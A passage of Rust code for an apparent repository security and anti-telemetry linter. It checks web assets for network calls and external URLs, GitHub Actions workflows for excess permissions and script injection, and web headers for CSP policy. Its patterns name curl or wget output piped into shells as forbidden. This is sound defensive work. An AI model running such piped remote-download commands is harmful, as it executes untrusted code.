                if is_binary_web_asset_blob(rel, &bytes) {
                    continue;
                }
                if bytes.contains(&0) {
                    let cleaned: Vec<u8> = bytes.iter().copied().filter(|&b| b != 0).collect();
                    String::from_utf8_lossy(&cleaned).into_owned()
                } else {
                    String::from_utf8_lossy(&bytes).into_owned()
                }
            }
        };
        scanned += 1;
        scan_text_for_web_telemetry(rel, &text, violations);
        if is_web_asset_file(rel) {
            web_asset_files.push((rel.clone(), text));
        }
    }

    let index_rel = "apps/curvebook-web/index.html";
    if !root.join(index_rel).is_file() {
        violations.push(TelemetryViolation {
            check: 3,
            path: index_rel.to_owned(),
            line: 1,
            detail: String::from("missing apps/curvebook-web/index.html"),
        });
    }
    for (rel, text) in web_asset_files {
        scan_web_asset_external_urls_and_apis(&rel, &text, violations);
    }

    Ok(scanned)
}

fn is_binary_web_asset_blob(rel: &str, bytes: &[u8]) -> bool {
    let ext = Path::new(rel).extension().and_then(|e| e.to_str()).map(str::to_ascii_lowercase).unwrap_or_default();
    if matches!(ext.as_str(), "png" | "jpg" | "jpeg" | "gif" | "webp" | "ico" | "icns" | "ttf" | "otf" | "woff" | "woff2" | "wasm" | "zip" | "pdf") {
        return true;
    }
    !is_web_asset_file(rel)
        && [&b"\x89PNG\r\n\x1a\n"[..], b"PK\x03\x04", b"\x00asm", b"wOF2", b"OTTO", b"\x00\x01\x00\x00"].iter().any(|sig| bytes.starts_with(sig))
}

fn is_web_asset_file(rel: &str) -> bool {
    let in_web = rel.starts_with("apps/curvebook-web/") || rel.starts_with("packaging/web/");
    if !in_web {
        return false;
    }
    matches!(
        Path::new(rel).extension().and_then(|e| e.to_str()).map(|s| s.to_ascii_lowercase()).as_deref(),
        Some("html" | "htm" | "js" | "mjs" | "cjs" | "ts" | "jsx" | "tsx" | "css" | "svg" | "json")
    )
}

fn is_browser_markup_or_script(rel: &str) -> bool {
    matches!(
        Path::new(rel).extension().and_then(|e| e.to_str()).map(|s| s.to_ascii_lowercase()).as_deref(),
        Some("html" | "htm" | "js" | "mjs" | "cjs" | "ts" | "jsx" | "tsx" | "svg")
    )
}

fn normalize_js_member_syntax(lower_line: &str) -> String {
    let mut out = String::with_capacity(lower_line.len());
    let bytes = lower_line.as_bytes();
    let mut i = 0usize;
    while i < bytes.len() {
        if bytes[i] == b'[' {
            let mut j = i + 1;
            while j < bytes.len() && bytes[j].is_ascii_whitespace() {
                j += 1;
            }
            if let Some(&q @ (b'\'' | b'"' | b'`')) = bytes.get(j) {
                j += 1;
                let ident_start = j;
                while j < bytes.len() && bytes[j] != q && bytes[j] != b'\n' {
                    j += 1;
                }
                if bytes.get(j) == Some(&q)
                    && let Some(raw_ident) = lower_line.get(ident_start..j)
                {
                    let ident = raw_ident.trim();
                    let mut k = j + 1;
                    while k < bytes.len() && bytes[k].is_ascii_whitespace() {
                        k += 1;
                    }
                    if bytes.get(k) == Some(&b']') && !ident.is_empty() && ident.bytes().all(is_ident_byte) {
                        out.push('.');
                        out.push_str(ident);
                        i = k + 1;
                        continue;
                    }
                }
            }
        }
        let ch = lower_line.get(i..).and_then(|s| s.chars().next()).unwrap_or(' ');
        out.push(ch);
        i += ch.len_utf8();
    }
    out
}

fn scan_text_for_web_telemetry(rel: &str, text: &str, violations: &mut Vec<TelemetryViolation>) {
    let check_fetch = is_browser_markup_or_script(rel);
    for (idx, line) in text.lines().enumerate() {
        let decoded = crate::text_decode::decode_xml_html_entities(line);
        let lower = normalize_js_member_syntax(&decoded.to_ascii_lowercase());
        for &term in BANNED_WEB_AND_WORKFLOW_TERMS {
            if contains_telemetry_term(&lower, term) {
                violations.push(TelemetryViolation {
                    check: 3,
                    path: rel.to_owned(),
                    line: idx + 1,
                    detail: format!("forbidden telemetry/cloud-service reference `{term}`"),
                });
            }
        }
        if check_fetch && contains_browser_fetch_call(&lower) {
            violations.push(TelemetryViolation {
                check: 3,
                path: rel.to_owned(),
                line: idx + 1,
                detail: String::from("forbidden network `fetch(` call"),
            });
        }
    }
}

fn contains_telemetry_term(lower_line: &str, term: &str) -> bool {
    let bytes = lower_line.as_bytes();
    let mut start = 0usize;
    while let Some(rel) = lower_line.get(start..).and_then(|s| s.find(term)) {
        let pos = start + rel;
        let end = pos + term.len();
        let left_ok = pos == 0 || !bytes[pos - 1].is_ascii_alphanumeric();
        let right_needs_boundary = term.as_bytes().last().is_some_and(u8::is_ascii_alphanumeric);
        let right_ok = !right_needs_boundary || end == bytes.len() || !bytes[end].is_ascii_alphanumeric();
        if left_ok && right_ok {
            return true;
        }
        start = pos + lower_line.get(pos..).and_then(|s| s.chars().next()).map_or(1, char::len_utf8);
    }
    false
}

fn contains_browser_fetch_call(lower_line: &str) -> bool {
    let bytes = lower_line.as_bytes();
    let needle = "fetch";
    let mut start = 0usize;
    while let Some(rel) = lower_line.get(start..).and_then(|s| s.find(needle)) {
        let pos = start + rel;
        let after_ws = lower_line.get(pos + needle.len()..).unwrap_or("").trim_start();
        let followed_by_paren = after_ws.starts_with('(');
        let left_is_ok = pos == 0
            || (bytes[pos - 1] != b'.' && !is_ident_byte(bytes[pos - 1]))
            || (bytes[pos - 1] == b'.' && lower_line.get(..pos).is_some_and(is_global_fetch_receiver));
        if followed_by_paren && left_is_ok {
            return true;
        }
        start = pos + 1;
    }
    false
}

fn is_global_fetch_receiver(before_fetch: &str) -> bool {
    let trimmed = before_fetch.trim_end();
    ["window.", "globalthis.", "self."].iter().any(|recv| {
        if let Some(prefix) = trimmed.strip_suffix(recv) { prefix.is_empty() || !is_ident_byte(prefix.as_bytes()[prefix.len() - 1]) } else { false }
    })
}

fn scan_web_asset_external_urls_and_apis(rel: &str, content: &str, violations: &mut Vec<TelemetryViolation>) {
    let is_css = rel.ends_with(".css");
    for (idx, line) in content.lines().enumerate() {
        let decoded = crate::text_decode::decode_xml_html_entities(line);
        let decoded_lower = decoded.to_ascii_lowercase();
        let norm_lower = normalize_js_member_syntax(&decoded_lower);
        for scheme in ["https://", "http://", "wss://", "ws://"] {
            let mut start = 0usize;
            while let Some(offset) = decoded_lower.get(start..).and_then(|s| s.find(scheme)) {
                let pos = start + offset;
                let rest = decoded.get(pos..).unwrap_or("");
                let end = rest.find(|c: char| c.is_whitespace() || matches!(c, '"' | '\'' | '<' | '>' | ')' | ';' | '`' | ',')).unwrap_or(rest.len());
                let url = rest.get(..end).unwrap_or(rest);
                if !ALLOWED_HTML_EXTERNAL_URLS.iter().any(|allowed| url.eq_ignore_ascii_case(allowed)) {
                    violations.push(TelemetryViolation {
                        check: 3,
                        path: rel.to_owned(),
                        line: idx + 1,
                        detail: format!("external URL `{url}` is forbidden in web assets"),
                    });
                }
                start = pos + scheme.len();
            }
        }
        scan_protocol_relative_urls(rel, idx + 1, &decoded, violations);
        if !is_css {
            scan_web_network_api_tokens(rel, idx + 1, &norm_lower, violations);
        }
    }
}

fn scan_protocol_relative_urls(rel: &str, line_no: usize, line: &str, violations: &mut Vec<TelemetryViolation>) {
    let bytes = line.as_bytes();
    let mut pos = 0usize;
    while let Some(offset) = line.get(pos..).and_then(|s| s.find("//")) {
        let hit = pos + offset;
        let prev_ok = hit > 0 && matches!(bytes[hit - 1], b'=' | b'"' | b'\'' | b'`' | b'(');
        let after = line.get(hit + 2..).unwrap_or("");
        let end = after.find(|c: char| c.is_whitespace() || matches!(c, '"' | '\'' | '<' | '>' | ')' | ';' | '`' | ',')).unwrap_or(after.len());
        let target = after.get(..end).unwrap_or(after);
        let host = target.split('/').next().unwrap_or(target);
        let looks_like_host = !host.is_empty()
            && host.bytes().all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-' | b':'))
            && (host.contains('.') || host.eq_ignore_ascii_case("localhost"));
        if prev_ok && looks_like_host {
            violations.push(TelemetryViolation {
                check: 3,
                path: rel.to_owned(),
                line: line_no,
                detail: format!("protocol-relative external URL `//{target}` is forbidden in web assets"),
            });
        }
        pos = hit + 2;
    }
}

fn scan_web_network_api_tokens(rel: &str, line_no: usize, lower: &str, violations: &mut Vec<TelemetryViolation>) {
    for api in ["websocket", "eventsource", "sharedworker", "serviceworker"] {
        let mut start = 0usize;
        while let Some(offset) = lower.get(start..).and_then(|s| s.find(api)) {
            let pos = start + offset;
            let bytes = lower.as_bytes();
            let left_ok = pos == 0 || !is_ident_byte(bytes[pos - 1]);
            let right_ok = pos + api.len() == bytes.len() || !is_ident_byte(bytes[pos + api.len()]);
            if left_ok && right_ok {
                violations.push(TelemetryViolation {
                    check: 3,
                    path: rel.to_owned(),
                    line: line_no,
                    detail: format!("forbidden browser network/worker API `{api}` in web asset"),
                });
                break;
            }
            start = pos + 1;
        }
    }
    let mut pos = 0usize;
    while let Some(offset) = lower.get(pos..).and_then(|s| s.find("worker")) {
        let hit = pos + offset;
        let left_ok = hit == 0 || !is_ident_byte(lower.as_bytes()[hit - 1]);
        let after_ws = lower.get(hit + "worker".len()..).unwrap_or("").trim_start();
        if left_ok && after_ws.starts_with('(') {
            violations.push(TelemetryViolation {
                check: 3,
                path: rel.to_owned(),
                line: line_no,
                detail: String::from("forbidden browser network/worker API `worker(` in web asset"),
            });
            break;
        }
        pos = hit + 1;
    }
}

/// Check 4: GitHub Actions workflow/composite-action permissions and `run:` script-injection hygiene.
fn check_workflow_security(root: &Path, violations: &mut Vec<TelemetryViolation>) -> Result<usize, String> {
    let workflows = collect_workflow_and_action_files(root)?;
    if workflows.is_empty() {
        violations.push(TelemetryViolation {
            check: 4,
            path: String::from(".github/workflows"),
            line: 1,
            detail: String::from("no GitHub Actions workflow files found"),
        });
        return Ok(0);
    }

    for rel in &workflows {
        let text = std::fs::read_to_string(root.join(rel)).map_err(|e| format!("{rel}: {e}"))?;
        let require_permissions = !rel.starts_with(".github/actions/");
        audit_workflow_yaml(rel, &text, require_permissions, violations);
    }
    Ok(workflows.len())
}

#[derive(Default)]
struct WorkflowParseState {
    in_jobs: bool,
    jobs_indent: usize,
    job_indent: Option<usize>,
    current_job: Option<String>,
    top_perm_indent: Option<usize>,
    job_perm_indent: Option<usize>,
    saw_top_permissions: bool,
    top_has_contents_read: bool,
    run_block: Option<RunBlockAccum>,
}

struct RunBlockAccum {
    key_col: usize,
    lines: Vec<(usize, String)>,
}

fn split_yaml_unquoted_key(trimmed: &str) -> Option<(&str, &str)> {
    let bytes = trimmed.as_bytes();
    let mut quote: Option<u8> = None;
    let mut i = 0usize;
    while i < bytes.len() {
        let b = bytes[i];
        if let Some(q) = quote {
            if b == b'\\' && q == b'"' {
                i += 2;
                continue;
            }
            if b == q {
                quote = None;
            }
        } else if b == b'"' || b == b'\'' {
            quote = Some(b);
        } else if b == b':' && bytes.get(i + 1).is_none_or(|n| n.is_ascii_whitespace()) {
            let (raw_key, after_colon) = trimmed.split_at_checked(i)?;
            let key = unquote_yaml_scalar(raw_key.trim());
            let rhs = after_colon.strip_prefix(':').unwrap_or(after_colon).trim();
            return Some((key, rhs));
        }
        i += 1;
    }
    None
}

fn flush_run_block(rel: &str, state: &mut WorkflowParseState, violations: &mut Vec<TelemetryViolation>) {
    let Some(block) = state.run_block.take() else {
        return;
    };
    if block.lines.is_empty() {
        return;
    }
    let mut combined = String::new();
    let mut offset_lines = Vec::new();
    for (idx, (ln, txt)) in block.lines.iter().enumerate() {
        if idx > 0 {
            combined.push('\n');
            offset_lines.push(*ln);
        }
        combined.push_str(txt);
        offset_lines.extend(std::iter::repeat_n(*ln, txt.len()));
    }
    flag_untrusted_event_expr_spans(rel, &combined, &offset_lines, violations);

    let mut logical_line_no = block.lines[0].0;
    let mut logical_cmd = String::new();
    for (ln, raw) in &block.lines {
        if logical_cmd.is_empty() {
            logical_line_no = *ln;
        }
        let code = strip_yaml_comment(raw).trim_end();
        if let Some(continued) = code.strip_suffix('\\') {
            logical_cmd.push_str(continued.trim_end());
            logical_cmd.push(' ');
        } else {
            logical_cmd.push_str(code);
            flag_remote_script_execution(rel, logical_line_no, &logical_cmd, violations);
            logical_cmd.clear();
        }
    }
    if !logical_cmd.is_empty() {
        flag_remote_script_execution(rel, logical_line_no, &logical_cmd, violations);
    }
}

fn audit_workflow_yaml(rel: &str, yaml: &str, require_permissions: bool, violations: &mut Vec<TelemetryViolation>) {
    let mut state = WorkflowParseState::default();
    for (idx, raw) in yaml.lines().enumerate() {
        let line_no = idx + 1;
        if let Some(ref mut block) = state.run_block {
            if raw.trim().is_empty() || leading_spaces(raw) > block.key_col {
                block.lines.push((line_no, raw.to_owned()));
                continue;
            }
            flush_run_block(rel, &mut state, violations);
        }

        let code = strip_yaml_comment(raw);
        let trimmed = code.trim();
        if trimmed.is_empty() {
            continue;
        }
        let indent = leading_spaces(code);
        update_workflow_scope(&mut state, indent, trimmed);
        if handle_permissions_line(rel, line_no, indent, trimmed, &mut state, violations) {
            continue;
        }
        check_workflow_uses_sha(rel, line_no, code, violations);
        check_run_directive(line_no, code, &mut state);
    }
    flush_run_block(rel, &mut state, violations);

    if require_permissions && (!state.saw_top_permissions || !state.top_has_contents_read) {
        violations.push(TelemetryViolation {
            check: 4,
            path: rel.to_owned(),
            line: 1,
            detail: String::from("workflow must declare top-level `permissions:` containing `contents: read`"),
        });
    }
}

fn update_workflow_scope(state: &mut WorkflowParseState, indent: usize, trimmed: &str) {
    if state.top_perm_indent.is_some_and(|p| indent <= p) {
        state.top_perm_indent = None;
    }
    if state.job_perm_indent.is_some_and(|p| indent <= p) {
        state.job_perm_indent = None;
    }
    if indent == 0 {
        let is_jobs = split_yaml_unquoted_key(trimmed).is_some_and(|(k, rhs)| k == "jobs" && rhs.is_empty());
        state.in_jobs = is_jobs;
        state.jobs_indent = 0;
        if !state.in_jobs {
            state.job_indent = None;
            state.current_job = None;
        }
        return;
    }
    if state.in_jobs && !trimmed.starts_with('-') {
        let expected = state.job_indent.get_or_insert(indent);
        if indent == *expected
            && let Some((job_key, rhs)) = split_yaml_unquoted_key(trimmed)
            && rhs.is_empty()
            && !job_key.contains(char::is_whitespace)
        {
            state.current_job = Some(job_key.to_owned());
        }
    }
}

fn handle_permissions_line(
    rel: &str,
    line_no: usize,
    indent: usize,
    trimmed: &str,
    state: &mut WorkflowParseState,
    violations: &mut Vec<TelemetryViolation>,
) -> bool {
    if let Some((key, rhs)) = split_yaml_unquoted_key(trimmed)
        && key == "permissions"
    {
        let clean_rhs = unquote_yaml_scalar(rhs);
        let is_top = indent == 0;
        if is_top {
            state.saw_top_permissions = true;
            state.top_perm_indent = Some(indent);
        } else {
            state.job_perm_indent = Some(indent);
        }
        if clean_rhs == "write-all" {
            violations.push(TelemetryViolation {
                check: 4,
                path: rel.to_owned(),
                line: line_no,
                detail: String::from("`permissions: write-all` is forbidden"),
            });
            return true;
        }
        if let Some(inner) = rhs.strip_prefix('{').and_then(|s| s.strip_suffix('}')) {
            for entry in inner.split(',') {
                if let Some((scope, level)) = split_yaml_unquoted_key(entry.trim()) {
                    validate_permission_entry(rel, line_no, scope, level, is_top, state, violations);
                }
            }
            if is_top {
                state.top_perm_indent = None;
            } else {
                state.job_perm_indent = None;
            }
        }
        return true;
    }

    if state.top_perm_indent.is_some_and(|p| indent > p)
        && let Some((scope, level)) = split_yaml_unquoted_key(trimmed)
    {
        validate_permission_entry(rel, line_no, scope, level, true, state, violations);
        return true;
    }

    if state.job_perm_indent.is_some_and(|p| indent > p)
        && let Some((scope, level)) = split_yaml_unquoted_key(trimmed)
    {
        validate_permission_entry(rel, line_no, scope, level, false, state, violations);
        return true;
    }
    false
}

fn validate_permission_entry(
    rel: &str,
    line_no: usize,
    scope: &str,
    level: &str,
    is_top: bool,
    state: &mut WorkflowParseState,
    violations: &mut Vec<TelemetryViolation>,
) {
    let clean_scope = unquote_yaml_scalar(scope);
    let clean_level = unquote_yaml_scalar(level);
    if is_top && clean_scope == "contents" && clean_level == "read" {
        state.top_has_contents_read = true;
    }
    if clean_level == "write" {
        let publish_ok = !is_top
            && rel == ".github/workflows/release.yml"
            && state.current_job.as_deref() == Some("publish")
            && matches!(clean_scope, "contents" | "id-token" | "attestations");
        let prune_caches_ok =
            !is_top && rel == ".github/workflows/ci.yml" && state.current_job.as_deref() == Some("prune-caches") && clean_scope == "actions";
        // R12.9: the Pages Actions source needs `pages: write` and an OIDC token to deploy the staged site.
        let pages_deploy_ok = !is_top
            && rel == ".github/workflows/pages.yml"
            && state.current_job.as_deref() == Some("deploy")
            && matches!(clean_scope, "pages" | "id-token");
        if !publish_ok && !prune_caches_ok && !pages_deploy_ok {
            violations.push(TelemetryViolation {
                check: 4,
                path: rel.to_owned(),
                line: line_no,
                detail: format!(
                    "unexpected write permission `{clean_scope}: write` \
                     (only release.yml `publish` job may declare `contents: write`, `id-token: write`, or `attestations: write`, \
                     ci.yml `prune-caches` job may declare `actions: write`, \
                     and pages.yml `deploy` job may declare `pages: write` or `id-token: write`)"
                ),
            });
        }
    }
}

fn check_workflow_uses_sha(rel: &str, line_no: usize, code: &str, violations: &mut Vec<TelemetryViolation>) {
    let trimmed = code.trim_start();
    let after_dash = trimmed.strip_prefix('-').map_or(trimmed, str::trim_start);
    let Some((key, rhs)) = split_yaml_unquoted_key(after_dash) else {
        return;
    };
    if key != "uses" {
        return;
    }
    let spec = unquote_yaml_scalar(rhs);
    if spec.starts_with("./") || spec.starts_with("../") {
        return;
    }
    let valid_sha = spec.split_once('@').is_some_and(|(_, ref_part)| ref_part.len() == 40 && ref_part.bytes().all(|b| b.is_ascii_hexdigit()));
    if !valid_sha {
        violations.push(TelemetryViolation {
            check: 4,
            path: rel.to_owned(),
            line: line_no,
            detail: format!("GitHub Action `{spec}` must be pinned to a full 40-character commit SHA"),
        });
    }
}

fn check_run_directive(line_no: usize, code: &str, state: &mut WorkflowParseState) {
    let Some((key_col, rhs)) = split_yaml_script_key(code) else {
        return;
    };
    let trimmed_rhs = rhs.trim();
    let effective_rhs =
        if let Some((_, inner_rhs)) = split_yaml_unquoted_key(trimmed_rhs).filter(|(k, _)| *k == "run") { inner_rhs } else { trimmed_rhs };
    let mut lines = Vec::new();
    if !effective_rhs.is_empty() && !is_yaml_block_scalar(effective_rhs) {
        lines.push((line_no, effective_rhs.to_owned()));
    }
    state.run_block = Some(RunBlockAccum { key_col, lines });
}

fn split_yaml_script_key(code: &str) -> Option<(usize, &str)> {
    let after_indent = code.trim_start_matches(' ');
    let indent = code.len() - after_indent.len();
    let (key_col, after_dash) = if let Some(rest) = after_indent.strip_prefix('-') {
        if !rest.is_empty() && !rest.starts_with(char::is_whitespace) {
            return None;
        }
        let after_extra = rest.trim_start_matches(' ');
        let extra = rest.len() - after_extra.len();
        (indent + 1 + extra, after_extra)
    } else {
        (indent, after_indent)
    };
    let (key, rhs) = split_yaml_unquoted_key(after_dash)?;
    match key {
        "run" | "script" | "prepare" => Some((key_col, rhs)),
        "with" if split_yaml_unquoted_key(rhs.trim_start()).is_some_and(|(k, _)| k == "run") => Some((key_col, rhs)),
        _ => None,
    }
}

fn is_yaml_block_scalar(rhs: &str) -> bool {
    let Some(rest) = rhs.strip_prefix('|').or_else(|| rhs.strip_prefix('>')) else {
        return false;
    };
    rest.chars().all(|c| matches!(c, '-' | '+' | '0'..='9'))
}

fn flag_untrusted_event_expr_spans(rel: &str, text: &str, offset_lines: &[usize], violations: &mut Vec<TelemetryViolation>) {
    let mut pos = 0usize;
    while let Some(start_rel) = text.get(pos..).and_then(|s| s.find("${{")) {
        let expr_line = offset_lines.get(pos + start_rel).copied().unwrap_or(1);
        let expr_start = pos + start_rel + 3;
        let after_open = text.get(expr_start..).unwrap_or("");
        let (expr, next_pos) = match after_open.split_once("}}") {
            Some((inner, _)) => (inner, expr_start + inner.len() + 2),
            None => (after_open, text.len()),
        };
        let lower_compact: String = expr.chars().filter(|c| !c.is_whitespace()).map(|c| c.to_ascii_lowercase()).collect();
        if let Some(ref_kind) = untrusted_expr_kind(&lower_compact) {
            violations.push(TelemetryViolation {
                check: 4,
                path: rel.to_owned(),
                line: expr_line,
                detail: format!("untrusted `${{{{ {ref_kind} }}}}` interpolated directly in workflow script block (use `env:` instead)"),
            });
        }
        pos = next_pos;
    }
}

fn untrusted_expr_kind(lower_compact: &str) -> Option<&'static str> {
    for (needle, label, needs_right_boundary) in [
        ("github.event.", "github.event.*", false),
        ("inputs.", "inputs.*", false),
        ("github.head_ref", "github.head_ref", true),
        ("github.ref_name", "github.ref_name", true),
    ] {
        if has_expr_token(lower_compact, needle, needs_right_boundary) {
            return Some(label);
        }
    }
    None
}

fn has_expr_token(lower_compact: &str, needle: &str, needs_right_boundary: bool) -> bool {
    let bytes = lower_compact.as_bytes();
    let mut pos = 0usize;
    while let Some(rel) = lower_compact.get(pos..).and_then(|s| s.find(needle)) {
        let hit = pos + rel;
        let end = hit + needle.len();
        let left_ok = hit == 0 || !is_ident_byte(bytes[hit - 1]);
        let right_ok = !needs_right_boundary || end == bytes.len() || !is_ident_byte(bytes[end]);
        if left_ok && right_ok {
            return true;
        }
        pos = hit + 1;
    }
    false
}

fn flag_remote_script_execution(rel: &str, line_no: usize, raw: &str, violations: &mut Vec<TelemetryViolation>) {
    let code = strip_yaml_comment(raw).trim();
    if code.is_empty() || code.starts_with('#') {
        return;
    }
    let lower = code.to_ascii_lowercase();
    if lower.contains("raw.githubusercontent.com/") && (lower.contains("/main/") || lower.contains("/master/") || lower.contains("latest")) {
        violations.push(TelemetryViolation {
            check: 4,
            path: rel.to_owned(),
            line: line_no,
            detail: String::from("unpinned remote script URL off `main`/`master` branch is forbidden in workflows"),
        });
    }
    let has_fetcher = contains_telemetry_term(&lower, "curl") || contains_telemetry_term(&lower, "wget");
    if has_fetcher
        && let Some((_, pipe_rhs)) = lower.split_once('|')
        && ["sh", "bash", "zsh", "dash", "python", "sudo tar", "tar "]
            .iter()
            .any(|sink| pipe_rhs.split_whitespace().collect::<Vec<_>>().join(" ").contains(sink))
    {
        violations.push(TelemetryViolation {
            check: 4,
            path: rel.to_owned(),
            line: line_no,
            detail: String::from("piping remote download directly to shell or archive extractor without sha256sum verification is forbidden"),
        });
    }
}

/// Check 5: static web security & anti-telemetry headers in `packaging/web/_headers` and `packaging/web/.htaccess`.
fn check_web_security_headers(root: &Path, violations: &mut Vec<TelemetryViolation>) -> Result<usize, String> {
    let mut count = 0usize;

    let headers_rel = "packaging/web/_headers";
    let headers_path = root.join(headers_rel);
    if !headers_path.is_file() {
        violations.push(TelemetryViolation {
            check: 5,
            path: headers_rel.to_owned(),
            line: 1,
            detail: String::from("missing packaging/web/_headers"),
        });
    } else {
        count += 1;
        let text = std::fs::read_to_string(&headers_path).map_err(|e| format!("{headers_rel}: {e}"))?;
        let (global_map, all_entries) = parse_netlify_header_blocks(&text);
        validate_required_web_headers(headers_rel, &global_map, &all_entries, violations);
    }

    let htaccess_rel = "packaging/web/.htaccess";
    let htaccess_path = root.join(htaccess_rel);
    if !htaccess_path.is_file() {
        violations.push(TelemetryViolation {
            check: 5,
            path: htaccess_rel.to_owned(),
            line: 1,
            detail: String::from("missing packaging/web/.htaccess"),
        });
    } else {
        count += 1;
        let text = std::fs::read_to_string(&htaccess_path).map_err(|e| format!("{htaccess_rel}: {e}"))?;
        let (global_map, all_entries) = parse_htaccess_headers(&text);
        validate_required_web_headers(htaccess_rel, &global_map, &all_entries, violations);
    }

    Ok(count)
}

type HeaderEntry = (String, usize, String);

fn parse_netlify_header_blocks(text: &str) -> (BTreeMap<String, (usize, String)>, Vec<HeaderEntry>) {
    let mut global = BTreeMap::new();
    let mut all = Vec::new();
    let mut in_global = false;
    for (idx, raw) in text.lines().enumerate() {
        let trimmed = raw.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        if !raw.starts_with(char::is_whitespace) {
            in_global = trimmed == "/*";
            continue;
        }
        if let Some((name, value)) = trimmed.split_once(':') {
            let key = name.trim().to_ascii_lowercase();
            let val = value.trim().to_owned();
            if in_global {
                global.insert(key.clone(), (idx + 1, val.clone()));
            }
            all.push((key, idx + 1, val));
        }
    }
    (global, all)
}

fn parse_htaccess_headers(text: &str) -> (BTreeMap<String, (usize, String)>, Vec<HeaderEntry>) {
    let mut map = BTreeMap::new();
    let mut all = Vec::new();
    for (idx, raw) in text.lines().enumerate() {
        let trimmed = raw.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        if let Some((name, value)) = parse_apache_header_set(trimmed) {
            let key = name.to_ascii_lowercase();
            map.insert(key.clone(), (idx + 1, value.clone()));
            all.push((key, idx + 1, value));
        }
    }
    (map, all)
}

fn parse_apache_header_set(trimmed: &str) -> Option<(String, String)> {
    let mut rest = trimmed;
    let first = next_ws_token(rest)?;
    if !first.0.eq_ignore_ascii_case("header") {
        return None;
    }
    rest = first.1.trim_start();
    let mut tok = next_ws_token(rest)?;
    if tok.0.eq_ignore_ascii_case("always") || tok.0.eq_ignore_ascii_case("onsuccess") {
        rest = tok.1.trim_start();
        tok = next_ws_token(rest)?;
    }
    if !matches!(tok.0.to_ascii_lowercase().as_str(), "set" | "setifempty" | "add" | "append") {
        return None;
    }
    rest = tok.1.trim_start();
    let (name, val_part) = next_ws_token(rest)?;
    let val = unquote_apache_value(val_part.trim());
    Some((name.to_owned(), val))
}

fn next_ws_token(s: &str) -> Option<(&str, &str)> {
    let trimmed = s.trim_start();
    if trimmed.is_empty() {
        return None;
    }
    match trimmed.find(char::is_whitespace).and_then(|idx| trimmed.split_at_checked(idx)) {
        Some((tok, rest)) => Some((tok, rest)),
        None => Some((trimmed, "")),
    }
}

fn unquote_apache_value(val: &str) -> String {
    val.strip_prefix('"')
        .and_then(|s| s.strip_suffix('"'))
        .or_else(|| val.strip_prefix('\'').and_then(|s| s.strip_suffix('\'')))
        .unwrap_or(val)
        .to_owned()
}

fn validate_required_web_headers(
    rel: &str,
    headers: &BTreeMap<String, (usize, String)>,
    all_entries: &[HeaderEntry],
    violations: &mut Vec<TelemetryViolation>,
) {
    if !headers.contains_key("content-security-policy") {
        violations.push(TelemetryViolation {
            check: 5,
            path: rel.to_owned(),
            line: 1,
            detail: String::from("missing `Content-Security-Policy` header"),
        });
    }
    if !headers.contains_key("referrer-policy") {
        violations.push(TelemetryViolation {
            check: 5,
            path: rel.to_owned(),
            line: 1,
            detail: String::from("missing `Referrer-Policy: no-referrer` header"),
        });
    }
    if !headers.contains_key("permissions-policy") {
        violations.push(TelemetryViolation { check: 5, path: rel.to_owned(), line: 1, detail: String::from("missing `Permissions-Policy` header") });
    }
    if !headers.contains_key("x-content-type-options") {
        violations.push(TelemetryViolation {
            check: 5,
            path: rel.to_owned(),
            line: 1,
            detail: String::from("missing `X-Content-Type-Options: nosniff` header"),
        });
    }
    if !headers.contains_key("cross-origin-opener-policy") {
        violations.push(TelemetryViolation {
            check: 5,
            path: rel.to_owned(),
            line: 1,
            detail: String::from("missing `Cross-Origin-Opener-Policy: same-origin` header"),
        });
    }
    if !headers.contains_key("cross-origin-embedder-policy") {
        violations.push(TelemetryViolation {
            check: 5,
            path: rel.to_owned(),
            line: 1,
            detail: String::from("missing `Cross-Origin-Embedder-Policy: require-corp` header"),
        });
    }

    for (key, line, val) in all_entries {
        match key.as_str() {
            "content-security-policy" => validate_csp_directives(rel, *line, val, violations),
            "referrer-policy" if !val.trim().eq_ignore_ascii_case("no-referrer") => violations.push(TelemetryViolation {
                check: 5,
                path: rel.to_owned(),
                line: *line,
                detail: format!("`Referrer-Policy` must be `no-referrer`, found `{val}`"),
            }),
            "permissions-policy" => {
                let compact: String = val.chars().filter(|c| !c.is_whitespace()).map(|c| c.to_ascii_lowercase()).collect();
                for feature in ["camera=()", "microphone=()", "geolocation=()"] {
                    if !compact.contains(feature) {
                        violations.push(TelemetryViolation {
                            check: 5,
                            path: rel.to_owned(),
                            line: *line,
                            detail: format!("`Permissions-Policy` must disable `{feature}`"),
                        });
                    }
                }
            }
            "x-content-type-options" if !val.trim().eq_ignore_ascii_case("nosniff") => violations.push(TelemetryViolation {
                check: 5,
                path: rel.to_owned(),
                line: *line,
                detail: format!("`X-Content-Type-Options` must be `nosniff`, found `{val}`"),
            }),
            "cross-origin-opener-policy" if !val.trim().eq_ignore_ascii_case("same-origin") => violations.push(TelemetryViolation {
                check: 5,
                path: rel.to_owned(),
                line: *line,
                detail: format!("`Cross-Origin-Opener-Policy` must be `same-origin`, found `{val}`"),
            }),
            "cross-origin-embedder-policy" if !val.trim().eq_ignore_ascii_case("require-corp") => violations.push(TelemetryViolation {
                check: 5,
                path: rel.to_owned(),
                line: *line,
                detail: format!("`Cross-Origin-Embedder-Policy` must be `require-corp`, found `{val}`"),
            }),
            _ => {}
        }
    }
}

fn validate_csp_directives(rel: &str, line: usize, csp: &str, violations: &mut Vec<TelemetryViolation>) {
    let directives: Vec<String> =
        csp.split(';').map(|d| d.split_whitespace().collect::<Vec<_>>().join(" ").to_ascii_lowercase()).filter(|d| !d.is_empty()).collect();

    for required in REQUIRED_CSP_DIRECTIVES {
        if !directives.iter().any(|d| d == required) {
            violations.push(TelemetryViolation {
                check: 5,
                path: rel.to_owned(),
                line,
                detail: format!("`Content-Security-Policy` missing exact directive `{required}`"),
            });
        }
    }

    for dir in &directives {
        let dir_name = dir.split_whitespace().next().unwrap_or("");
        for tok in dir.split_whitespace().skip(1) {
            let allowed_data = tok == "data:" && matches!(dir_name, "img-src" | "font-src");
            let allowed_blob = tok == "blob:" && dir_name == "img-src";
            let is_scheme_source = tok.ends_with(':') && !allowed_data && !allowed_blob;
            if tok.contains("://") || tok.starts_with("//") || tok.contains('*') || is_scheme_source || tok == "'unsafe-eval'" {
                violations.push(TelemetryViolation {
                    check: 5,
                    path: rel.to_owned(),
                    line,
                    detail: format!("`Content-Security-Policy` forbids external/unsafe source `{tok}` in `{dir}`"),
                });
            }
        }
    }
}

